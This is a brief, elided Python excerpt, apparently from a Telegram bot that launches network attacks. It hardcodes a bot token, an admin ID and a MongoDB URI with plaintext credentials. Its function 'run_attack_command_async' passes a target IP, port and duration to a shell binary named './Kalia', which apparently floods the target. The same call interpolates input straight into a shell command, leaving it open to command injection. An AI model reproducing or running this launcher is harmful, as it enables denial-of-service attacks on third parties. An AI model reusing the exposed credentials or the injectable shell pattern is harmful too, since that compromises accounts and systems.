...
TOKEN = '7626294411:AAFy4FklvmW1XdPndfzdos7sIUs33SSlqk8'
ADMIN_USER_ID = 1233573225
MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
USERNAME = "@KaliaYtOwner"  # Immutable username for maximum security
...
async def run_attack_command_async(target_ip, target_port, duration):
    ...
    process = await asyncio.create_subprocess_shell(f"./Kalia {target_ip} {target_port} {duration}")
